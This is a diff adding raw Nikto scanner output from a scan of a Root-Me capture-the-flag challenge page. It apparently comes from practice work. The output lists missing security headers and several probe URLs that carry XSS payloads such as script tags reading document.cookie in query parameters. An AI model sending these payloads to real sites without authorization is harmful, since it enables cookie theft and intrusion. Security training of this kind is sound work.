@@ -1,0 +1,14 @@
+- Nikto v2.1.6/2.1.5
++ Target Host: challenge01.root-me.org
++ Target Port: 80
++ GET The anti-clickjacking X-Frame-Options header is not present.
++ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ GET /realiste/ch6/index.php?option=search&searchword=<script>alert(document.cookie);</script>: Mambo Site Server 4.0 build 10 is vulnerable to Cross Site Scripting (XSS). CA-2000-02.
++ OSVDB-2820: GET /realiste/ch6/index.php?dir=<script>alert('Vulnerable')</script>: Auto Directory Index 1.2.3 and prior are vulnerable to XSS attacks.
++ OSVDB-50552: GET /realiste/ch6/index.php?file=Liens&op=\"><script>alert('Vulnerable');</script>: Nuked-klan 1.3b is vulnerable to Cross Site Scripting (XSS). CA-2000-02.
++ GET /realiste/ch6/index.php?action=storenew&username=<script>alert('Vulnerable')</script>: SunShop is vulnerable to Cross Site Scripting (XSS) in the signup page. CA-200-02.
++ OSVDB-38019: GET /realiste/ch6/?mod=<script>alert(document.cookie)</script>&op=browse: Sage 1.0b3 is vulnerable to Cross Site Scripting (XSS). CA-2000-02.
++ OSVDB-25497: GET /realiste/ch6/index.php?rep=<script>alert(document.cookie)</script>: GPhotos index.php rep Variable XSS.
++ OSVDB-12606: GET /realiste/ch6/index.php?err=3&email=\"><script>alert(document.cookie)</script>: MySQL Eventum is vulnerable to XSS in the email field.
++ OSVDB-2790: GET /realiste/ch6/index.php?vo=\"><script>alert(document.cookie);</script>: Ralusp Sympoll 1.5 is vulnerable to Cross Site Scripting (XSS). CA-2000-02.
